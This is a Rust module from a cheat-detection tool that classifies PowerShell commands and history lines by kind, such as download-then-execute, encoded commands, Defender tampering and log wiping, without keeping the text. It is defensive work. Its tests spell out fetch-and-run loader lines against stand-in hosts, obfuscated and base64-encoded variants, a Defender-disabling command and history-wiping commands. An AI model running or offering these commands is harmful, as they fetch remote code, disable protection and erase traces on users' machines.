// SPDX-FileCopyrightText: 2026 aeterna-rongroi contributors
// SPDX-License-Identifier: GPL-3.0-or-later
// Part of aeterna-rongroi, a cheat-detection tool. Using it to evade detection is out of scope — see AGENTS.md.

//! Which kinds of words a PowerShell command, script block or command line held — never the words
//! (ADR 0064).
//!
//! **This module keeps no text.** Its input is something a person typed, or the text of a script, or the
//! command line a program was started with: personal data, and possibly a password, a token or a key.
//! [`classify`] reads it once, in memory, and returns booleans for a fixed list of [`Kinds`] and, at
//! most, the host part of one download URL ([`DownloadHost`]). Nothing else of the input survives the
//! call. This is the second place in this crate that drops what it reads on purpose, beside the event
//! payload in [`crate::evtx`] (ADR 0018), and for the same reason; the crate's "nothing read is silently
//! dropped" rule is about bytes whose meaning is not established, and here the meaning is exactly what
//! must not be kept.
//!
//! The classification is a fixed list in code (ADR 0064 section 2), not a rules-bundle file: what this
//! module keeps decides what is read from a PC, which is an ADR's decision. **No word names a cheat or a
//! seller.**
//!
//! # What it undoes, and what it does not
//!
//! Before matching, a text is lower-cased, PowerShell's escape characters (`` ` `` and cmd's `^`) are
//! removed, adjacent string literals joined by `+` are joined, and whitespace is collapsed. An
//! `-EncodedCommand` argument (any prefix PowerShell accepts, `-e` to `-encodedcommand`, and `-ec`) and a
//! `FromBase64String('…')` literal are decoded as UTF-16LE base64, at most [`DECODE_LEVELS`] deep and
//! [`DECODE_MAX`] characters each, and matched with the rest. Anything else — a word built from
//! character codes, a variable, a reversed string — is read as it stands, so a kind it hides is `false`,
//! not unknown. Callers say so wherever a `false` is shown (ADR 0064, "What is unverified").

use std::net::IpAddr;

use crate::error::ParseError;

/// How many times an encoded command inside an encoded command is decoded.
pub const DECODE_LEVELS: usize = 2;

/// The longest base64 argument decoded, in characters (64 KiB of UTF-16 text once decoded).
pub const DECODE_MAX: usize = 87_384;

/// The longest host name kept, in bytes (DNS's own limit).
const HOST_MAX: usize = 253;

/// Which kinds of words a text held (ADR 0064 section 2). Every field is `false` unless the text held it.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq)]
#[allow(clippy::struct_excessive_bools)] // one boolean per kind is the design: a rule matches each one
pub struct Kinds {
    /// `Invoke-Expression`, `iex`, `[scriptblock]::Create`, `.Invoke()`.
    pub invoke_expression: bool,
    /// `DownloadString`, `DownloadData`, `DownloadFile`, `Invoke-WebRequest`, `iwr`, `Invoke-RestMethod`,
    /// `irm`, `Net.WebClient`, `Start-BitsTransfer`, `curl`, `wget`.
    pub remote_download: bool,
    /// `remote_download` and `invoke_expression` in the same text.
    pub download_then_execute: bool,
    /// An `-EncodedCommand` argument or a `FromBase64String` literal.
    pub encoded_command: bool,
    /// At least one of those decoded.
    pub decoded: bool,
    /// `-ExecutionPolicy Bypass` or `Unrestricted`, `-ep bypass`, `Set-ExecutionPolicy`.
    pub execution_policy_bypass: bool,
    /// `-WindowStyle Hidden`, `-w h`.
    pub hidden_window: bool,
    /// `Add-Type`, `DllImport`, `VirtualAlloc`, `OpenProcess`, `WriteProcessMemory`, `ReadProcessMemory`.
    pub native_interop: bool,
    /// `Add-MpPreference` with an exclusion, `Set-MpPreference` with a `-Disable…` switch.
    pub defender_tamper: bool,
    /// `Clear-History`, `wevtutil cl`, `Clear-EventLog`, `Remove-EventLog`, removing a `*_history.txt` file
    /// or files under `Prefetch`.
    pub trace_cleanup: bool,
    /// `FiveM` or `GTA5` anywhere.
    pub game_process: bool,
}

impl Kinds {
    /// Whether any kind is true. `decoded` alone is not a kind: it qualifies `encoded_command`.
    pub fn any(&self) -> bool {
        self.invoke_expression
            || self.remote_download
            || self.encoded_command
            || self.execution_policy_bypass
            || self.hidden_window
            || self.native_interop
            || self.defender_tamper
            || self.trace_cleanup
            || self.game_process
    }
}

/// What an address host is, never the address (ADR 0064 section 4, as `net_config` reports a hosts line).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum AddressKind {
    /// `127.0.0.0/8`, `::1`.
    Loopback,
    /// `10/8`, `172.16/12`, `192.168/16`, `169.254/16`, `fc00::/7`, `fe80::/10`.
    Private,
    /// `0.0.0.0`, `::`.
    Unspecified,
    /// Any other address.
    Public,
}

impl AddressKind {
    /// Stable word used in observations.
    pub fn as_str(self) -> &'static str {
        match self {
            Self::Loopback => "loopback",
            Self::Private => "private",
            Self::Unspecified => "unspecified",
            Self::Public => "public",
        }
    }
}

/// The host of the first download URL in a text: the one piece of a text this module keeps.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum DownloadHost {
    /// A name, lower-cased, of letters, digits, `.` and `-` only. No scheme, user, password, port, path or
    /// query: those are where a per-customer key would be.
    Name(String),
    /// An address, by its kind only.
    Address(AddressKind),
}

/// One text's classification.
#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub struct Classification {
    /// Which kinds the text held.
    pub kinds: Kinds,
    /// The first download URL's host, when `kinds.remote_download` is true and a URL with a host the rules
    /// above accept was there. `None` otherwise — including when a URL was there but its host was not a
    /// plain name or an address, which is dropped rather than kept.
    pub download_host: Option<DownloadHost>,
}

/// One `PSReadLine` history file, classified line by line (ADR 0064 section 3).
#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub struct History {
    /// Lines in the file.
    pub lines: usize,
    /// Lines that were not valid UTF-8 and were read with replacement characters.
    pub lossy_lines: usize,
    /// For each line that held at least one kind: how many lines from the end it is (1 is the last line,
    /// the newest command) and its classification. Oldest first.
    pub classified: Vec<(usize, Classification)>,
}

/// Classifies one text. Never fails: a text that holds none of the kinds is all `false`.
pub fn classify(text: &str) -> Classification {
    let mut combined = String::with_capacity(text.len());
    combined.push_str(text);
    let mut encoded = false;
    let mut decoded = false;
    // Each level decodes what the previous one exposed; what it decodes is matched with the rest.
    let mut frontier = text.to_owned();
    for _ in 0..DECODE_LEVELS {
        let (found, texts) = decode_all(&frontier);
        encoded |= found;
        if texts.is_empty() {
            break;
        }
        decoded = true;
        frontier = texts.join(" ");
        combined.push(' ');
        combined.push_str(&frontier);
    }
    let normal = normalise(&combined);
    let tokens: Vec<&str> = normal.split(' ').filter(|t| !t.is_empty()).collect();

    let invoke_expression = normal.contains("invoke-expression")
        || has_word(&normal, "iex")
        || normal.contains("[scriptblock]::create")
        || normal.contains(".invoke()");
    let remote_download = [
        "downloadstring",
        "downloaddata",
        "downloadfile",
        "invoke-webrequest",
        "invoke-restmethod",
        "net.webclient",
        "start-bitstransfer",
    ]
    .iter()
    .any(|w| normal.contains(w))
        || ["iwr", "irm", "curl", "wget"]
            .iter()
            .any(|w| has_word(&normal, w));
    let execution_policy_bypass = normal.contains("executionpolicy bypass")
        || normal.contains("executionpolicy unrestricted")
        || normal.contains("set-executionpolicy")
        || pair(
            &tokens,
            |a| a == "-ep",
            |b| b == "bypass" || b == "unrestricted",
        );
    let hidden_window = pair(
        &tokens,
        |a| a.len() >= 2 && "-windowstyle".starts_with(a),
        |b| b == "hidden" || b == "h" || b == "1",
    );
    let native_interop = [
        "add-type",
        "dllimport",
        "virtualalloc",
        "openprocess",
        "writeprocessmemory",
        "readprocessmemory",
    ]
    .iter()
    .any(|w| normal.contains(w));
    let defender_tamper = (normal.contains("add-mppreference") && normal.contains("-exclusion"))
        || (normal.contains("set-mppreference") && normal.contains("-disable"));
    let removes = ["remove-item", "del", "rm", "ri", "erase"]
        .iter()
        .any(|w| has_word(&normal, w));
    let trace_cleanup = normal.contains("clear-history")
        || normal.contains("clear-eventlog")
        || normal.contains("remove-eventlog")
        || pair(
            &tokens,
            |a| a == "wevtutil" || a == "wevtutil.exe",
            |b| b == "cl" || b == "clear-log",
        )
        || (removes && (normal.contains("_history.txt") || normal.contains("\\prefetch")));
    let game_process = normal.contains("fivem") || normal.contains("gta5");

    let kinds = Kinds {
        invoke_expression,
        remote_download,
        download_then_execute: invoke_expression && remote_download,
        encoded_command: encoded,
        decoded,
        execution_policy_bypass,
        hidden_window,
        native_interop,
        defender_tamper,
        trace_cleanup,
        game_process,
    };
    let download_host = if remote_download {
        first_url_host(&combined)
    } else {
        None
    };
    Classification {
        kinds,
        download_host,
    }
}

/// Classifies every line of a `PSReadLine` history file: UTF-8, with or without a byte-order mark, lines
/// ending in `\n` or `\r\n`. A line that is not UTF-8 is read with replacement characters and counted in
/// [`History::lossy_lines`]; a file is never refused for it. The `Result` is the crate's contract for
/// every parser over bytes (ADR 0013), kept so a later format check has somewhere to report.
#[allow(clippy::unnecessary_wraps)]
pub fn parse_history(bytes: &[u8]) -> Result<History, ParseError> {
    let body = bytes.strip_prefix(&[0xEF, 0xBB, 0xBF]).unwrap_or(bytes);
    let mut raw: Vec<&[u8]> = body.split(|b| *b == b'\n').collect();
    if raw.last().is_some_and(|l| l.is_empty()) {
        raw.pop();
    }
    let lines = raw.len();
    let mut history = History {
        lines,
        ..History::default()
    };
    for (index, line) in raw.iter().enumerate() {
        let line = line.strip_suffix(b"\r").unwrap_or(line);
        let text = String::from_utf8_lossy(line);
        if matches!(text, std::borrow::Cow::Owned(_)) {
            history.lossy_lines += 1;
        }
        let classification = classify(&text);
        if classification.kinds.any() {
            history.classified.push((lines - index, classification));
        }
    }
    Ok(history)
}

/// Lower-cases, removes escapes, joins `'a' + 'b'` and collapses whitespace.
fn normalise(text: &str) -> String {
    let lowered: String = text
        .chars()
        .filter(|c| *c != '`' && *c != '^')
        .flat_map(char::to_lowercase)
        .collect();
    let mut joined = lowered;
    for quote in ['\'', '"'] {
        joined = join_literals(&joined, quote);
    }
    let mut out = String::with_capacity(joined.len());
    let mut space = false;
    for c in joined.chars() {
        if c.is_whitespace() {
            space = true;
        } else {
            if space && !out.is_empty() {
                out.push(' ');
            }
            space = false;
            out.push(c);
        }
    }
    out
}

/// Removes `quote` `+` `quote` (with any whitespace around the `+`), so `'down' + 'loadstring'` reads as one
/// word.
fn join_literals(text: &str, quote: char) -> String {
    let chars: Vec<char> = text.chars().collect();
    let mut out = String::with_capacity(text.len());
    let mut i = 0;
    while let Some(&c) = chars.get(i) {
        if c == quote {
            let mut j = i + 1;
            while chars.get(j).is_some_and(|c| c.is_whitespace()) {
                j += 1;
            }
            if chars.get(j) == Some(&'+') {
                let mut k = j + 1;
                while chars.get(k).is_some_and(|c| c.is_whitespace()) {
                    k += 1;
                }
                if chars.get(k) == Some(&quote) {
                    i = k + 1;
                    continue;
                }
            }
        }
        out.push(c);
        i += 1;
    }
    out
}

/// Whether `word` occurs with no letter, digit or `_` on either side.
fn has_word(text: &str, word: &str) -> bool {
    let ident = |c: char| c.is_alphanumeric() || c == '_';
    text.match_indices(word).any(|(at, _)| {
        let before = text.get(..at).and_then(|s| s.chars().next_back());
        let after = text.get(at + word.len()..).and_then(|s| s.chars().next());
        !before.is_some_and(ident) && !after.is_some_and(ident)
    })
}

/// Whether two adjacent tokens satisfy `first` and `second`. Tokens are compared with surrounding quotes
/// removed.
fn pair(tokens: &[&str], first: impl Fn(&str) -> bool, second: impl Fn(&str) -> bool) -> bool {
    tokens.windows(2).any(|w| match w {
        [a, b] => first(unquote(a)) && second(unquote(b)),
        _ => false,
    })
}

fn unquote(token: &str) -> &str {
    token.trim_matches(|c| c == '\'' || c == '"')
}

/// Every base64 argument in `text` that decodes as UTF-16LE text, and whether there was any argument at
/// all. Matching is on the original case, which base64 needs.
fn decode_all(text: &str) -> (bool, Vec<String>) {
    let mut found = false;
    let mut out = Vec::new();
    let tokens: Vec<&str> = text.split_whitespace().collect();
    for w in tokens.windows(2) {
        if let [flag, value] = w {
            let flag = flag.to_ascii_lowercase();
            let is_flag = flag == "-ec"
                || (flag.len() >= 2
                    && flag.starts_with("-e")
                    && "-encodedcommand".starts_with(&flag));
            let value = unquote(value);
            if is_flag && value.len() >= 16 && is_base64(value) {
                found = true;
                if let Some(t) = decode_utf16_base64(value) {
                    out.push(t);
                }
            }
        }
    }
    let lower = text.to_ascii_lowercase();
    let needle = "frombase64string(";
    for (at, _) in lower.match_indices(needle) {
        let rest = text.get(at + needle.len()..).unwrap_or("").trim_start();
        let Some(quote) = rest.chars().next().filter(|c| *c == '\'' || *c == '"') else {
            continue;
        };
        let inner = rest.get(1..).unwrap_or("");
        let literal = inner.split(quote).next().unwrap_or("");
        if !literal.is_empty() && is_base64(literal) {
            found = true;
            if let Some(t) = decode_utf16_base64(literal) {
                out.push(t);
            }
        }
    }
    (found, out)
}

fn is_base64(s: &str) -> bool {
    s.bytes()
        .all(|b| b.is_ascii_alphanumeric() || b == b'+' || b == b'/' || b == b'=')
}

/// Standard base64, then UTF-16LE. `None` when it is too long, not base64, an odd number of bytes, or
/// not text.
fn decode_utf16_base64(s: &str) -> Option<String> {
    if s.len() > DECODE_MAX {
        return None;
    }
    let mut bytes = Vec::with_capacity(s.len() / 4 * 3);
    let mut acc: u32 = 0;
    let mut bits = 0u32;
    for b in s.bytes() {
        let v = match b {
            b'A'..=b'Z' => b - b'A',
            b'a'..=b'z' => b - b'a' + 26,
            b'0'..=b'9' => b - b'0' + 52,
            b'+' => 62,
            b'/' => 63,
            b'=' => break,
            _ => return None,
        };
        acc = (acc << 6) | u32::from(v);
        bits += 6;
        if bits >= 8 {
            bits -= 8;
            bytes.push(u8::try_from((acc >> bits) & 0xFF).ok()?);
        }
    }
    if bytes.is_empty() || bytes.len() % 2 != 0 {
        return None;
    }
    let units: Vec<u16> = bytes
        .as_chunks::<2>()
        .0
        .iter()
        .map(|pair| u16::from_le_bytes(*pair))
        .collect();
    let text = String::from_utf16(&units).ok()?;
    // Text, not binary that happened to have an even length: mostly printable characters.
    let printable = text
        .chars()
        .filter(|c| !c.is_control() || c.is_whitespace())
        .count();
    (printable * 10 >= text.chars().count() * 9).then_some(text)
}

/// The host of the first `http://` or `https://` URL, reduced as [`DownloadHost`] says.
fn first_url_host(text: &str) -> Option<DownloadHost> {
    let lower = text.to_ascii_lowercase();
    let start = ["http://", "https://"]
        .iter()
        .filter_map(|scheme| lower.find(scheme).map(|at| at + scheme.len()))
        .min()?;
    let rest = lower.get(start..)?;
    let authority: &str = rest
        .split(|c: char| {
            c == '/'
                || c == '\\'
                || c == '?'
                || c == '#'
                || c == '\''
                || c == '"'
                || c == '`'
                || c == ')'
                || c == ';'
                || c == ','
                || c.is_whitespace()
        })
        .next()?;
    let host_port = authority.rsplit('@').next()?;
    let host = if let Some(v6) = host_port.strip_prefix('[') {
        v6.split(']').next()?
    } else {
        host_port.split(':').next()?
    };
    if host.is_empty() {
        return None;
    }
    if let Ok(ip) = host.parse::<IpAddr>() {
        return Some(DownloadHost::Address(address_kind(ip)));
    }
    let plain = host.len() <= HOST_MAX
        && host
            .bytes()
            .all(|b| b.is_ascii_lowercase() || b.is_ascii_digit() || b == b'.' || b == b'-');
    plain.then(|| DownloadHost::Name(host.to_owned()))
}

fn address_kind(ip: IpAddr) -> AddressKind {
    match ip {
        IpAddr::V4(v4) => {
            if v4.is_unspecified() {
                AddressKind::Unspecified
            } else if v4.is_loopback() {
                AddressKind::Loopback
            } else if v4.is_private() || v4.is_link_local() {
                AddressKind::Private
            } else {
                AddressKind::Public
            }
        }
        IpAddr::V6(v6) => {
            let first = v6.segments().first().copied().unwrap_or(0);
            if v6.is_unspecified() {
                AddressKind::Unspecified
            } else if v6.is_loopback() {
                AddressKind::Loopback
            } else if first & 0xFE00 == 0xFC00 || first & 0xFFC0 == 0xFE80 {
                AddressKind::Private
            } else {
                AddressKind::Public
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn kinds(text: &str) -> Kinds {
        classify(text).kinds
    }

    fn encode(script: &str) -> String {
        let bytes: Vec<u8> = script.encode_utf16().flat_map(u16::to_le_bytes).collect();
        let table = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        let mut out = String::new();
        for chunk in bytes.chunks(3) {
            let b = [
                chunk.first().copied().unwrap_or(0),
                chunk.get(1).copied().unwrap_or(0),
                chunk.get(2).copied().unwrap_or(0),
            ];
            let n = (u32::from(b[0]) << 16) | (u32::from(b[1]) << 8) | u32::from(b[2]);
            for i in 0..4 {
                if i <= chunk.len() {
                    let idx = usize::try_from((n >> (18 - 6 * i)) & 63).unwrap_or(0);
                    out.push(char::from(table.get(idx).copied().unwrap_or(b'A')));
                } else {
                    out.push('=');
                }
            }
        }
        out
    }

    #[test]
    fn the_loader_line_shapes_are_download_then_execute() {
        for line in [
            "irm https://example.invalid/x | iex",
            "iex (New-Object Net.WebClient).DownloadString('https://example.invalid/a.ps1')",
            "Invoke-Expression (Invoke-WebRequest -UseBasicParsing https://example.invalid/b).Content",
            "IEX(iwr example.invalid/c)",
        ] {
            let k = kinds(line);
            assert!(k.download_then_execute, "{line}");
            assert!(k.invoke_expression && k.remote_download, "{line}");
        }
    }

    #[test]
    fn ordinary_commands_hold_no_kind() {
        for line in [
            "Get-ChildItem C:\\Users",
            "git status",
            "cd .\\projects; code .",
            "Get-Process | Where-Object CPU -gt 10",
            "echo prefix-iexplore",
            "$irmgard = 3",
        ] {
            assert!(!kinds(line).any(), "{line}");
        }
    }

    #[test]
    fn escapes_and_joined_literals_are_undone() {
        assert!(
            kinds("i`e`x (New-Object Net.WebClient).('Down'+'loadString')('http://x.invalid')")
                .download_then_execute
        );
        assert!(kinds("powershell -c \"i^e^x (irm http://x.invalid)\"").download_then_execute);
    }

    #[test]
    fn an_encoded_command_is_decoded_and_matched() {
        let enc = encode("irm https://payload.example.invalid/x | iex");
        for flag in ["-e", "-ec", "-enc", "-EncodedCommand", "-encodedc"] {
            let c = classify(&format!("powershell.exe -NoP {flag} {enc}"));
            assert!(c.kinds.encoded_command && c.kinds.decoded, "{flag}");
            assert!(c.kinds.download_then_execute, "{flag}");
            assert_eq!(
                c.download_host,
                Some(DownloadHost::Name("payload.example.invalid".to_owned()))
            );
        }
    }

    #[test]
    fn two_levels_are_decoded_and_no_more() {
        let inner = encode("iex (irm http://deep.example.invalid)");
        let outer = encode(&format!("powershell -enc {inner}"));
        assert!(kinds(&format!("powershell -enc {outer}")).download_then_execute);
        let third = encode(&format!("powershell -enc {outer}"));
        let k = kinds(&format!("powershell -enc {third}"));
        assert!(k.encoded_command && !k.download_then_execute);
    }

    #[test]
    fn a_frombase64string_literal_is_decoded() {
        let enc = encode("Add-MpPreference -ExclusionPath C:\\x");
        let k = kinds(&format!(
            "[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('{enc}'))"
        ));
        assert!(k.encoded_command && k.decoded && k.defender_tamper);
    }

    #[test]
    fn something_that_is_not_base64_text_is_encoded_and_not_decoded() {
        let k = kinds("powershell -enc AAAAAAAAAAAAAAAAAAAAAA==");
        assert!(k.encoded_command && !k.decoded);
        assert!(!kinds("Get-Thing -e short").encoded_command);
    }

    #[test]
    fn each_kind_has_a_positive() {
        assert!(kinds("powershell -ExecutionPolicy Bypass -File x.ps1").execution_policy_bypass);
        assert!(kinds("powershell -ep bypass").execution_policy_bypass);
        assert!(kinds("Set-ExecutionPolicy RemoteSigned").execution_policy_bypass);
        assert!(kinds("powershell -w h -c x").hidden_window);
        assert!(kinds("powershell -WindowStyle Hidden").hidden_window);
        assert!(!kinds("Write-Host -what h").hidden_window);
        assert!(kinds("Add-Type -MemberDefinition '[DllImport(\"kernel32.dll\")]'").native_interop);
        assert!(kinds("Set-MpPreference -DisableRealtimeMonitoring $true").defender_tamper);
        assert!(kinds("Add-MpPreference -ExclusionProcess x.exe").defender_tamper);
        assert!(!kinds("Get-MpPreference").defender_tamper);
        assert!(kinds("Clear-History").trace_cleanup);
        assert!(kinds("wevtutil cl Security").trace_cleanup);
        assert!(
            kinds("Remove-Item (Get-PSReadLineOption).HistorySavePath; rm ConsoleHost_history.txt")
                .trace_cleanup
        );
        assert!(kinds("del C:\\Windows\\Prefetch\\*.pf").trace_cleanup);
        assert!(!kinds("Get-ChildItem C:\\Windows\\Prefetch").trace_cleanup);
        assert!(kinds("Get-Process FiveM").game_process);
        assert!(kinds("Stop-Process -Name GTA5_Enhanced").game_process);
    }

    #[test]
    fn the_host_is_only_the_host() {
        let c = classify(
            "irm 'https://User:Secret@Cdn.Example.Invalid:8443/key/ABCDEF?token=xyz' | iex",
        );
        assert_eq!(
            c.download_host,
            Some(DownloadHost::Name("cdn.example.invalid".to_owned()))
        );
        let all = format!("{c:?}");
        for secret in [
            "secret", "Secret", "ABCDEF", "abcdef", "xyz", "8443", "user", "key",
        ] {
            assert!(!all.contains(secret), "{secret} leaked: {all}");
        }
    }

    #[test]
    fn an_address_is_kept_as_its_kind() {
        let host = |t: &str| classify(t).download_host;
        assert_eq!(
            host("iwr http://127.0.0.1/x"),
            Some(DownloadHost::Address(AddressKind::Loopback))
        );
        assert_eq!(
            host("iwr http://192.168.1.5:80/x"),
            Some(DownloadHost::Address(AddressKind::Private))
        );
        assert_eq!(
            host("iwr http://[::1]/x"),
            Some(DownloadHost::Address(AddressKind::Loopback))
        );
        assert_eq!(
            host("iwr http://8.8.8.8/x"),
            Some(DownloadHost::Address(AddressKind::Public))
        );
        assert_eq!(
            host("iwr http://0.0.0.0/x"),
            Some(DownloadHost::Address(AddressKind::Unspecified))
        );
    }

    #[test]
    fn a_host_that_is_not_a_plain_name_is_dropped() {
        assert_eq!(
            classify("iwr http://ex%41mple.invalid/x").download_host,
            None
        );
        assert_eq!(classify("iwr http:///x").download_host, None);
        assert_eq!(
            classify("Get-Date; 'https://example.invalid'").download_host,
            None
        );
    }

    #[test]
    fn history_lines_are_counted_from_the_end_and_keep_no_text() {
        let file = "\u{feff}git status\r\nirm https://a.example.invalid/x | iex\r\n$p = 'hunter2'\r\nClear-History\r\n";
        let h = parse_history(file.as_bytes()).unwrap_or_default();
        assert_eq!(h.lines, 4);
        assert_eq!(h.lossy_lines, 0);
        let from_end: Vec<usize> = h.classified.iter().map(|(n, _)| *n).collect();
        assert_eq!(from_end, [3, 1]);
        let all = format!("{h:?}");
        for text in ["hunter2", "git status", "irm", "Clear-History"] {
            assert!(!all.contains(text), "{text} leaked: {all}");
        }
    }

    #[test]
    fn a_history_line_that_is_not_utf8_is_read_lossily() {
        let h = parse_history(b"ok\n\xff\xfe iex (irm http://x.invalid)\n").unwrap_or_default();
        assert_eq!((h.lines, h.lossy_lines, h.classified.len()), (2, 1, 1));
        assert_eq!(parse_history(b"").unwrap_or_default().lines, 0);
    }
}
